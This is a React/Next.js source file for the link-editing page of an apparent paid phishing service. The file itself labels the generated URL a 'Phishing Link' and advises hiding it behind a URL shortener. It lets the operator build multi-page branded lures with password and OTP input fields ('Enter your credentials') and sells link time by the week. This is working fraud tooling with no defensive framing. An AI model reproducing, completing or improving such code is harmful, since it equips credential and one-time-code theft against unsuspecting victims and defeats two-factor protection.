'use client';

import { useParams, useRouter } from 'next/navigation';
import { useEffect, useState } from 'react';
import { toast } from 'react-hot-toast';
import { format } from 'date-fns';
import { FaCopy } from 'react-icons/fa';
import { 
  PlusIcon, 
  TrashIcon, 
  ChevronUpIcon, 
  ChevronDownIcon,
  EyeIcon
} from '@heroicons/react/24/outline';

type InputType = 'text' | 'email' | 'password' | 'tel' | 'number' | 'otp';

interface PageInput {
  label: string;
  placeholder: string;
  type: InputType;
  required: boolean;
}

interface CustomPage {
  pageNumber: number;
  title: string;
  subtitle: string;
  writeup: string;
  logoUrl: string;
  backgroundUrl: string;
  backgroundColor: string;
  textColor: string;
  buttonText: string;
  buttonColor: string;
  buttonTextColor: string;
  inputs: PageInput[];
}

interface SuccessPage {
  title: string;
  message: string;
  buttonText: string;
  buttonUrl: string;
}

interface ScratchLink {
  _id: string;
  linkId: string;
  linkName: string;
  linkType: string;
  expiresAt: string;
  customPages: CustomPage[];
  successPage: SuccessPage;
}

const INPUT_TYPES: { value: InputType; label: string }[] = [
  { value: 'text', label: 'Text' },
  { value: 'email', label: 'Email' },
  { value: 'password', label: 'Password' },
  { value: 'tel', label: 'Phone Number' },
  { value: 'number', label: 'Number' },
  { value: 'otp', label: 'OTP Code' },
];

const MAX_PAGES = 5;

export default function ScratchLinkDetails() {
  const params = useParams();
  const router = useRouter();
  const [link, setLink] = useState<ScratchLink | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [isFetching, setIsFetching] = useState(true);
  const [duration, setDuration] = useState(1);
  const [activePageIndex, setActivePageIndex] = useState(0);
  const [showPreview, setShowPreview] = useState(false);

  const [customPages, setCustomPages] = useState<CustomPage[]>([]);
  const [successPage, setSuccessPage] = useState<SuccessPage>({
    title: 'Success!',
    message: 'Your submission has been received.',
    buttonText: 'Done',
    buttonUrl: '',
  });
  const [linkName, setLinkName] = useState('');

  const socialLinkHostAddress = process.env.NEXT_PUBLIC_SOCIAL_LINK_HOST;

  const pricePerWeek = 4000; // Base price for scratch links

  useEffect(() => {
    fetchLinkDetails();
  }, [params.id]);

  const fetchLinkDetails = async () => {
    setIsFetching(true);
    try {
      const response = await fetch(`/api/auth/links/${params.id}`);
      if (!response.ok) throw new Error('Failed to fetch link details');
      const data = await response.json();

      // Redirect to regular details page if not a scratch link
      if (data.linkType !== 'scratch') {
        router.replace(`/links/${params.id}`);
        return;
      }

      setLink(data);
      setLinkName(data.linkName || '');
      setCustomPages(data.customPages || []);
      setSuccessPage(data.successPage || {
        title: 'Success!',
        message: 'Your submission has been received.',
        buttonText: 'Done',
        buttonUrl: '',
      });
    } catch (error) {
      toast.error('Error fetching link details');
      console.error(error);
    } finally {
      setIsFetching(false);
    }
  };

  const activePage = customPages[activePageIndex];

  const updatePage = (pageIndex: number, updates: Partial<CustomPage>) => {
    setCustomPages(prev => prev.map((page, i) => 
      i === pageIndex ? { ...page, ...updates } : page
    ));
  };

  const addPage = () => {
    if (customPages.length >= MAX_PAGES) {
      toast.error(`Maximum ${MAX_PAGES} pages allowed`);
      return;
    }
    const newPage: CustomPage = {
      pageNumber: customPages.length + 1,
      title: '',
      subtitle: '',
      writeup: '',
      logoUrl: '',
      backgroundUrl: '',
      backgroundColor: '#ffffff',
      textColor: '#111827',
      buttonText: 'Continue',
      buttonColor: '#3b82f6',
      buttonTextColor: '#ffffff',
      inputs: [{ label: '', placeholder: '', type: 'text', required: true }],
    };
    setCustomPages(prev => [...prev, newPage]);
    setActivePageIndex(customPages.length);
  };

  const removePage = (pageIndex: number) => {
    if (customPages.length <= 1) {
      toast.error('You need at least one page');
      return;
    }
    setCustomPages(prev => {
      const newPages = prev.filter((_, i) => i !== pageIndex);
      // Renumber pages
      return newPages.map((page, i) => ({ ...page, pageNumber: i + 1 }));
    });
    if (activePageIndex >= customPages.length - 1) {
      setActivePageIndex(Math.max(0, activePageIndex - 1));
    }
  };

  const movePage = (pageIndex: number, direction: 'up' | 'down') => {
    const newIndex = direction === 'up' ? pageIndex - 1 : pageIndex + 1;
    if (newIndex < 0 || newIndex >= customPages.length) return;
    
    setCustomPages(prev => {
      const newPages = [...prev];
      [newPages[pageIndex], newPages[newIndex]] = [newPages[newIndex], newPages[pageIndex]];
      // Renumber pages
      return newPages.map((page, i) => ({ ...page, pageNumber: i + 1 }));
    });
    setActivePageIndex(newIndex);
  };

  const addInput = (pageIndex: number) => {
    const page = customPages[pageIndex];
    updatePage(pageIndex, {
      inputs: [...page.inputs, { label: '', placeholder: '', type: 'text', required: true }],
    });
  };

  const removeInput = (pageIndex: number, inputIndex: number) => {
    const page = customPages[pageIndex];
    if (page.inputs.length <= 1) {
      toast.error('Each page needs at least one input');
      return;
    }
    updatePage(pageIndex, {
      inputs: page.inputs.filter((_, i) => i !== inputIndex),
    });
  };

  const updateInput = (pageIndex: number, inputIndex: number, updates: Partial<PageInput>) => {
    const page = customPages[pageIndex];
    updatePage(pageIndex, {
      inputs: page.inputs.map((input, i) => 
        i === inputIndex ? { ...input, ...updates } : input
      ),
    });
  };

  const validateForm = (): boolean => {
    if (!linkName.trim()) {
      toast.error('Link name is required');
      return false;
    }

    for (let i = 0; i < customPages.length; i++) {
      const page = customPages[i];
      if (!page.title.trim()) {
        toast.error(`Page ${i + 1}: Title is required`);
        setActivePageIndex(i);
        return false;
      }
      if (!page.buttonText.trim()) {
        toast.error(`Page ${i + 1}: Button text is required`);
        setActivePageIndex(i);
        return false;
      }
      for (let j = 0; j < page.inputs.length; j++) {
        const input = page.inputs[j];
        if (!input.label.trim()) {
          toast.error(`Page ${i + 1}, Input ${j + 1}: Label is required`);
          setActivePageIndex(i);
          return false;
        }
      }
    }

    return true;
  };

  const handleUpdate = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateForm()) return;

    setIsLoading(true);
    try {
      const response = await fetch(`/api/auth/links/${params.id}/scratch`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          linkName,
          customPages,
          successPage,
        }),
      });
      const data = await response.json();
      if (!response.ok) {
        toast.error(data.error || 'Error updating link');
        return;
      }

      toast.success('Link updated successfully');
      fetchLinkDetails();
    } catch (error) {
      toast.error('Error updating link');
      console.error(error);
    } finally {
      setIsLoading(false);
    }
  };

  const handleExtend = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    try {
      const response = await fetch(`/api/auth/links/${params.id}/extend`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ duration }),
      });
      const data = await response.json();
      if (!response.ok) {
        toast.error(data.error || 'Error extending link');
        return;
      }

      toast.success('Link extended successfully');
      fetchLinkDetails();
    } catch (error) {
      toast.error('Error extending link');
      console.error(error);
    } finally {
      setIsLoading(false);
    }
  };

  const handleDelete = async () => {
    if (!confirm('Are you sure you want to delete this link?')) return;

    setIsLoading(true);
    try {
      const response = await fetch(`/api/auth/links/${params.id}`, {
        method: 'DELETE',
      });

      if (!response.ok) throw new Error('Failed to delete link');

      toast.success('Link deleted successfully');
      router.push('/links');
    } catch (error) {
      toast.error('Error deleting link');
      console.error(error);
    } finally {
      setIsLoading(false);
    }
  };

  if (isFetching) {
    return (
      <div className="flex items-center justify-center min-h-[400px]">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-purple-500"></div>
      </div>
    );
  }

  if (!link) {
    return <div className="p-4 text-center text-gray-400">Link not found</div>;
  }

  return (
    <div className="max-w-4xl mx-auto py-6">
      <div className="flex items-center justify-between mb-6">
        <h1 className="text-2xl font-semibold text-purple-400">Custom Link Details</h1>
        <button
          type="button"
          onClick={() => setShowPreview(!showPreview)}
          className="flex items-center gap-2 px-4 py-2 bg-gray-800 text-gray-300 rounded-lg hover:bg-gray-700 transition"
        >
          <EyeIcon className="w-5 h-5" />
          Preview
        </button>
      </div>

      {/* Extend Duration Section */}
      <form onSubmit={handleExtend} className="bg-gray-900/50 border border-gray-800 rounded-lg p-6 mb-6">
        <h2 className="text-lg font-medium text-white mb-4">Extend Expiration Date</h2>
        <p className="text-sm text-gray-400 mb-4">
          Current expiry: <span className="text-purple-400">{format(new Date(link.expiresAt), 'PPP')}</span>
        </p>
        
        <div className="mb-4">
          <label className="block text-sm font-medium text-gray-400 mb-2">
            Extend by:
          </label>
          <div className="flex flex-wrap gap-2">
            {[
              { value: 1, label: '1 Week' },
              { value: 2, label: '2 Weeks' },
              { value: 4, label: '1 Month' },
              { value: 8, label: '2 Months' },
              { value: 12, label: '3 Months' }
            ].map((option) => (
              <button
                key={option.value}
                type="button"
                onClick={() => setDuration(option.value)}
                className={`px-4 py-2 rounded-full text-sm font-medium transition-colors
                  ${duration === option.value
                    ? 'bg-purple-600 text-white'
                    : 'bg-gray-800 text-gray-400 hover:bg-gray-700'
                  }`}
              >
                {option.label}
              </button>
            ))}
          </div>
        </div>

        <div className="flex items-center justify-between bg-gray-800/50 rounded-lg p-4 mb-4">
          <span className="text-gray-400">Price</span>
          <span className="text-xl font-semibold text-purple-400">
            ₦{(duration * pricePerWeek).toLocaleString()}
          </span>
        </div>

        <button
          type="submit"
          disabled={isLoading}
          className="w-full py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 transition disabled:opacity-50"
        >
          {isLoading ? 'Extending...' : 'Extend Duration'}
        </button>
      </form>

      {/* Link URL Section */}
      <div className="bg-gray-900/50 border border-gray-800 rounded-lg p-6 mb-6">
        <label className="block text-sm font-medium text-gray-400 mb-2">
          Phishing Link
        </label>
        <div className="relative">
          <input
            type="text"
            value={`${socialLinkHostAddress?.trim()}/slink/${link.linkId}`}
            disabled
            className="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded-lg text-gray-300 pr-12"
          />
          <button
            type="button"
            onClick={() => {
              navigator.clipboard.writeText(`${socialLinkHostAddress?.trim()}/slink/${link.linkId}`);
              toast.success('URL copied to clipboard');
            }}
            className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white"
          >
            <FaCopy className="w-4 h-4" />
          </button>
        </div>
        <p className="mt-2 text-xs text-gray-500">
          Copy the link and use a URL shortener to shorten it.
        </p>
      </div>

      {/* Edit Pages Section */}
      <form onSubmit={handleUpdate} className="space-y-6">
        {/* Link Name */}
        <div className="bg-gray-900/50 border border-gray-800 rounded-lg p-6">
          <label className="block text-sm font-medium text-gray-400 mb-2">
            Link Name
          </label>
          <input
            type="text"
            value={linkName}
            onChange={(e) => setLinkName(e.target.value)}
            className="w-full px-4 py-2 bg-gray-900 border border-gray-700 rounded-lg focus:ring-1 focus:ring-purple-600 text-gray-100"
            placeholder="Give this link a name (for your reference)"
            maxLength={50}
          />
        </div>

        {/* Pages Editor */}
        <div className="bg-gray-900/50 border border-gray-800 rounded-lg p-6">
          <div className="flex items-center justify-between mb-4">
            <h2 className="text-lg font-medium text-gray-200">
              Pages <span className="text-sm text-gray-500">({customPages.length}/{MAX_PAGES})</span>
            </h2>
            <button
              type="button"
              onClick={addPage}
              disabled={customPages.length >= MAX_PAGES}
              className="flex items-center gap-2 px-3 py-1.5 bg-purple-600 text-white text-sm rounded-lg hover:bg-purple-700 transition disabled:opacity-50 disabled:cursor-not-allowed"
            >
              <PlusIcon className="w-4 h-4" />
              Add Page
            </button>
          </div>

          {/* Page Tabs */}
          <div className="flex flex-wrap gap-2 mb-6">
            {customPages.map((page, index) => (
              <button
                key={index}
                type="button"
                onClick={() => setActivePageIndex(index)}
                className={`px-4 py-2 rounded-lg text-sm font-medium transition ${
                  activePageIndex === index
                    ? 'bg-purple-600 text-white'
                    : 'bg-gray-800 text-gray-400 hover:bg-gray-700'
                }`}
              >
                Page {index + 1}
              </button>
            ))}
          </div>

          {/* Active Page Editor */}
          {activePage && (
            <div className="space-y-6 border-t border-gray-800 pt-6">
              {/* Page Actions */}
              <div className="flex items-center gap-2">
                <button
                  type="button"
                  onClick={() => movePage(activePageIndex, 'up')}
                  disabled={activePageIndex === 0}
                  className="p-2 bg-gray-800 text-gray-400 rounded-lg hover:bg-gray-700 disabled:opacity-50 disabled:cursor-not-allowed"
                  title="Move Up"
                >
                  <ChevronUpIcon className="w-4 h-4" />
                </button>
                <button
                  type="button"
                  onClick={() => movePage(activePageIndex, 'down')}
                  disabled={activePageIndex === customPages.length - 1}
                  className="p-2 bg-gray-800 text-gray-400 rounded-lg hover:bg-gray-700 disabled:opacity-50 disabled:cursor-not-allowed"
                  title="Move Down"
                >
                  <ChevronDownIcon className="w-4 h-4" />
                </button>
                <button
                  type="button"
                  onClick={() => removePage(activePageIndex)}
                  disabled={customPages.length <= 1}
                  className="p-2 bg-red-900/50 text-red-400 rounded-lg hover:bg-red-900 disabled:opacity-50 disabled:cursor-not-allowed"
                  title="Delete Page"
                >
                  <TrashIcon className="w-4 h-4" />
                </button>
              </div>

              {/* Page Settings */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-medium text-gray-400 mb-2">
                    Page Title *
                  </label>
                  <input
                    type="text"
                    value={activePage.title}
                    onChange={(e) => updatePage(activePageIndex, { title: e.target.value })}
                    className="w-full px-4 py-2 bg-gray-900 border border-gray-700 rounded-lg focus:ring-1 focus:ring-purple-600 text-gray-100"
                    placeholder="e.g., Login to continue"
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-400 mb-2">
                    Subtitle
                  </label>
                  <input
                    type="text"
                    value={activePage.subtitle}
                    onChange={(e) => updatePage(activePageIndex, { subtitle: e.target.value })}
                    className="w-full px-4 py-2 bg-gray-900 border border-gray-700 rounded-lg focus:ring-1 focus:ring-purple-600 text-gray-100"
                    placeholder="e.g., Enter your credentials"
                  />
                </div>
                <div className="md:col-span-2">
                  <label className="block text-sm font-medium text-gray-400 mb-2">
                    Writeup (optional)
                  </label>
                  <textarea
                    value={activePage.writeup}
                    onChange={(e) => updatePage(activePageIndex, { writeup: e.target.value })}
                    className="w-full px-4 py-2 bg-gray-900 border border-gray-700 rounded-lg focus:ring-1 focus:ring-purple-600 text-gray-100"
                    rows={2}
                    placeholder="Additional text to display before the form"
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-400 mb-2">
                    Logo URL
                  </label>
                  <input
                    type="text"
                    value={activePage.logoUrl}
                    onChange={(e) => updatePage(activePageIndex, { logoUrl: e.target.value })}
                    className="w-full px-4 py-2 bg-gray-900 border border-gray-700 rounded-lg focus:ring-1 focus:ring-purple-600 text-gray-100"
                    placeholder="https://example.com/logo.png"
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-400 mb-2">
                    Background Image URL
                  </label>
                  <input
                    type="text"
                    value={activePage.backgroundUrl}
                    onChange={(e) => updatePage(activePageIndex, { backgroundUrl: e.target.value })}
                    className="w-full px-4 py-2 bg-gray-900 border border-gray-700 rounded-lg focus:ring-1 focus:ring-purple-600 text-gray-100"
                    placeholder="https://example.com/bg.jpg"
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-400 mb-2">
                    Background Color
                  </label>
                  <div className="flex gap-2">
                    <input
                      type="color"
                      value={activePage.backgroundColor || '#ffffff'}
                      onChange={(e) => updatePage(activePageIndex, { backgroundColor: e.target.value })}
                      className="w-12 h-10 rounded cursor-pointer"
                    />
                    <input
                      type="text"
                      value={activePage.backgroundColor || '#ffffff'}
                      onChange={(e) => updatePage(activePageIndex, { backgroundColor: e.target.value })}
                      className="flex-1 px-4 py-2 bg-gray-900 border border-gray-700 rounded-lg focus:ring-1 focus:ring-purple-600 text-gray-100"
                    />
                  </div>
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-400 mb-2">
                    Text Color
                  </label>
                  <div className="flex gap-2">
                    <input
                      type="color"
                      value={activePage.textColor || '#111827'}
                      onChange={(e) => updatePage(activePageIndex, { textColor: e.target.value })}
                      className="w-12 h-10 rounded cursor-pointer"
                    />
                    <input
                      type="text"
                      value={activePage.textColor || '#111827'}
                      onChange={(e) => updatePage(activePageIndex, { textColor: e.target.value })}
                      className="flex-1 px-4 py-2 bg-gray-900 border border-gray-700 rounded-lg focus:ring-1 focus:ring-purple-600 text-gray-100"
                    />
                  </div>
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-400 mb-2">
                    Button Color
                  </label>
                  <div className="flex gap-2">
                    <input
                      type="color"
                      value={activePage.buttonColor || '#3b82f6'}
                      onChange={(e) => updatePage(activePageIndex, { buttonColor: e.target.value })}
                      className="w-12 h-10 rounded cursor-pointer"
                    />
                    <input
                      type="text"
                      value={activePage.buttonColor || '#3b82f6'}
                      onChange={(e) => updatePage(activePageIndex, { buttonColor: e.target.value })}
                      className="flex-1 px-4 py-2 bg-gray-900 border border-gray-700 rounded-lg focus:ring-1 focus:ring-purple-600 text-gray-100"
                    />
                  </div>
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-400 mb-2">
                    Button Text Color
                  </label>
                  <div className="flex gap-2">
                    <input
                      type="color"
                      value={activePage.buttonTextColor || '#ffffff'}
                      onChange={(e) => updatePage(activePageIndex, { buttonTextColor: e.target.value })}
                      className="w-12 h-10 rounded cursor-pointer"
                    />
                    <input
                      type="text"
                      value={activePage.buttonTextColor || '#ffffff'}
                      onChange={(e) => updatePage(activePageIndex, { buttonTextColor: e.target.value })}
                      className="flex-1 px-4 py-2 bg-gray-900 border border-gray-700 rounded-lg focus:ring-1 focus:ring-purple-600 text-gray-100"
                    />
                  </div>
                </div>
                <div className="md:col-span-2">
                  <label className="block text-sm font-medium text-gray-400 mb-2">
                    Button Text *
                  </label>
                  <input
                    type="text"
                    value={activePage.buttonText}
                    onChange={(e) => updatePage(activePageIndex, { buttonText: e.target.value })}
                    className="w-full px-4 py-2 bg-gray-900 border border-gray-700 rounded-lg focus:ring-1 focus:ring-purple-600 text-gray-100"
                    placeholder="e.g., Continue, Submit, Next"
                  />
                </div>
              </div>

              {/* Inputs Section */}
              <div className="border-t border-gray-800 pt-6">
                <div className="flex items-center justify-between mb-4">
                  <h3 className="text-md font-medium text-gray-300">Input Fields</h3>
                  <button
                    type="button"
                    onClick={() => addInput(activePageIndex)}
                    className="flex items-center gap-1 px-3 py-1.5 bg-gray-800 text-gray-300 text-sm rounded-lg hover:bg-gray-700 transition"
                  >
                    <PlusIcon className="w-4 h-4" />
                    Add Input
                  </button>
                </div>

                <div className="space-y-4">
                  {activePage.inputs.map((input, inputIndex) => (
                    <div key={inputIndex} className="bg-gray-800/50 rounded-lg p-4">
                      <div className="flex items-center justify-between mb-3">
                        <span className="text-sm font-medium text-gray-400">
                          Input {inputIndex + 1}
                        </span>
                        <button
                          type="button"
                          onClick={() => removeInput(activePageIndex, inputIndex)}
                          disabled={activePage.inputs.length <= 1}
                          className="p-1 text-red-400 hover:text-red-300 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          <TrashIcon className="w-4 h-4" />
                        </button>
                      </div>
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                        <div>
                          <label className="block text-xs text-gray-500 mb-1">Label *</label>
                          <input
                            type="text"
                            value={input.label}
                            onChange={(e) => updateInput(activePageIndex, inputIndex, { label: e.target.value })}
                            className="w-full px-3 py-2 bg-gray-900 border border-gray-700 rounded-lg focus:ring-1 focus:ring-purple-600 text-gray-100 text-sm"
                            placeholder="e.g., Email Address"
                          />
                        </div>
                        <div>
                          <label className="block text-xs text-gray-500 mb-1">Placeholder</label>
                          <input
                            type="text"
                            value={input.placeholder}
                            onChange={(e) => updateInput(activePageIndex, inputIndex, { placeholder: e.target.value })}
                            className="w-full px-3 py-2 bg-gray-900 border border-gray-700 rounded-lg focus:ring-1 focus:ring-purple-600 text-gray-100 text-sm"
                            placeholder="e.g., Enter your email"
                          />
                        </div>
                        <div>
                          <label className="block text-xs text-gray-500 mb-1">Type</label>
                          <select
                            value={input.type}
                            onChange={(e) => updateInput(activePageIndex, inputIndex, { type: e.target.value as InputType })}
                            className="w-full px-3 py-2 bg-gray-900 border border-gray-700 rounded-lg focus:ring-1 focus:ring-purple-600 text-gray-100 text-sm"
                          >
                            {INPUT_TYPES.map((type) => (
                              <option key={type.value} value={type.value}>
                                {type.label}
                              </option>
                            ))}
                          </select>
                        </div>
                        <div className="flex items-center">
                          <label className="flex items-center gap-2 cursor-pointer">
                            <input
                              type="checkbox"
                              checked={input.required}
                              onChange={(e) => updateInput(activePageIndex, inputIndex, { required: e.target.checked })}
                              className="w-4 h-4 rounded border-gray-600 text-purple-600 focus:ring-purple-600"
                            />
                            <span className="text-sm text-gray-400">Required</span>
                          </label>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}
        </div>

        {/* Success Page Settings */}
        <div className="bg-gray-900/50 border border-gray-800 rounded-lg p-6">
          <h2 className="text-lg font-medium text-gray-200 mb-4">Success Page</h2>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <label className="block text-sm font-medium text-gray-400 mb-2">
                Success Title
              </label>
              <input
                type="text"
                value={successPage.title}
                onChange={(e) => setSuccessPage({ ...successPage, title: e.target.value })}
                className="w-full px-4 py-2 bg-gray-900 border border-gray-700 rounded-lg focus:ring-1 focus:ring-purple-600 text-gray-100"
                placeholder="Success!"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-400 mb-2">
                Success Button Text
              </label>
              <input
                type="text"
                value={successPage.buttonText}
                onChange={(e) => setSuccessPage({ ...successPage, buttonText: e.target.value })}
                className="w-full px-4 py-2 bg-gray-900 border border-gray-700 rounded-lg focus:ring-1 focus:ring-purple-600 text-gray-100"
                placeholder="Done"
              />
            </div>
            <div className="md:col-span-2">
              <label className="block text-sm font-medium text-gray-400 mb-2">
                Success Message
              </label>
              <textarea
                value={successPage.message}
                onChange={(e) => setSuccessPage({ ...successPage, message: e.target.value })}
                className="w-full px-4 py-2 bg-gray-900 border border-gray-700 rounded-lg focus:ring-1 focus:ring-purple-600 text-gray-100"
                rows={2}
                placeholder="Your submission has been received."
              />
            </div>
            <div className="md:col-span-2">
              <label className="block text-sm font-medium text-gray-400 mb-2">
                Redirect URL (optional)
              </label>
              <input
                type="text"
                value={successPage.buttonUrl}
                onChange={(e) => setSuccessPage({ ...successPage, buttonUrl: e.target.value })}
                className="w-full px-4 py-2 bg-gray-900 border border-gray-700 rounded-lg focus:ring-1 focus:ring-purple-600 text-gray-100"
                placeholder="https://example.com (leave empty to stay on success page)"
              />
            </div>
          </div>
        </div>

        {/* Save Button */}
        <button
          type="submit"
          disabled={isLoading}
          className="w-full py-3 bg-purple-600 text-white rounded-lg hover:bg-purple-700 transition disabled:opacity-50 flex items-center justify-center gap-2"
        >
          {isLoading ? (
            <>
              <svg className="animate-spin h-5 w-5" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
              </svg>
              Saving...
            </>
          ) : (
            'Save Changes'
          )}
        </button>
      </form>

      {/* Danger Zone */}
      <div className="mt-8 bg-gray-900/50 border border-red-900/50 rounded-lg p-6">
        <h2 className="text-lg font-medium text-red-400 mb-4">Danger Zone</h2>
        <p className="text-sm text-gray-400 mb-4">
          Once you delete a link, there is no going back. Please be certain.
        </p>
        <button
          onClick={handleDelete}
          disabled={isLoading}
          className="w-full py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 transition disabled:opacity-50"
        >
          {isLoading ? 'Deleting...' : 'Delete Link'}
        </button>
      </div>

      {/* Preview Modal */}
      {showPreview && activePage && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80">
          <div className="relative w-full max-w-md">
            <button
              onClick={() => setShowPreview(false)}
              className="absolute -top-10 right-0 text-white hover:text-gray-300"
            >
              Close Preview
            </button>
            <div 
              className="relative rounded-lg overflow-hidden shadow-2xl"
              style={{ backgroundColor: activePage.backgroundColor }}
            >
              {activePage.backgroundUrl && (
                <div 
                  className="absolute inset-0 bg-cover bg-center opacity-20"
                  style={{ backgroundImage: `url(${activePage.backgroundUrl})` }}
                />
              )}
              <div className="relative p-8">
                {activePage.logoUrl && (
                  // eslint-disable-next-line @next/next/no-img-element
                  <img 
                    src={activePage.logoUrl} 
                    alt="Logo" 
                    className="h-12 mx-auto mb-6 object-contain"
                    onError={(e) => { e.currentTarget.style.display = 'none'; }}
                  />
                )}
                <h2 
                  className="text-xl font-bold text-center mb-2"
                  style={{ color: activePage.textColor || '#111827' }}
                >
                  {activePage.title || 'Page Title'}
                </h2>
                {activePage.subtitle && (
                  <p className="text-center mb-4" style={{ color: activePage.textColor || '#111827', opacity: 0.7 }}>{activePage.subtitle}</p>
                )}
                {activePage.writeup && (
                  <p className="text-sm mb-6" style={{ color: activePage.textColor || '#111827', opacity: 0.7 }}>{activePage.writeup}</p>
                )}
                <div className="space-y-4">
                  {activePage.inputs.map((input, idx) => (
                    <div key={idx}>
                      <label className="block text-sm font-medium mb-1" style={{ color: activePage.textColor || '#111827' }}>
                        {input.label || 'Input Label'}
                        {input.required && <span className="text-red-500 ml-1">*</span>}
                      </label>
                      <input
                        type={input.type}
                        placeholder={input.placeholder}
                        className="w-full px-4 py-3 border border-gray-300 rounded-lg"
                        disabled
                      />
                    </div>
                  ))}
                </div>
                <button
                  className="w-full mt-6 py-3 rounded-lg font-medium"
                  style={{ backgroundColor: activePage.buttonColor || '#3b82f6', color: activePage.buttonTextColor || '#ffffff' }}
                  disabled
                >
                  {activePage.buttonText || 'Continue'}
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
